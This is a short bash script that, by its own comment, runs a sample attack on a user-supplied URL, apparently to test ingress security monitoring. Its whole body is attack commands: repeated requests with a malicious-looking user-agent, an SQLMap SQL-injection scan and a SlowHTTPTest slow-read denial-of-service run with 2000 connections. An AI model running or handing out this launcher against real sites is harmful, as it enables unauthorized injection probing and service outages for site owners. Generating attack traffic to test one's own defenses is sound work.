#!/bin/bash
#
# This script runs a sample attack using known malicious user-agent and using SQLMap and SlowHTTPTest docker images.  
# Pre-requisite for docker daemon to be running
#
#
if [[ $# -eq 0 ]]
  then
    echo "No argument supplied.  Run ./ingress.sh <url>"
    exit 1
fi
for i in {1..10}; do curl -k $1 -H "User-Agent:BloodguyBrowser-_-"-; done
sudo docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap --url $1/?id=1
sudo docker run shekyan/slowhttptest:latest -c 2000 -X -i 10 -r 200 -t GET -u $1 -x 24 -p 2
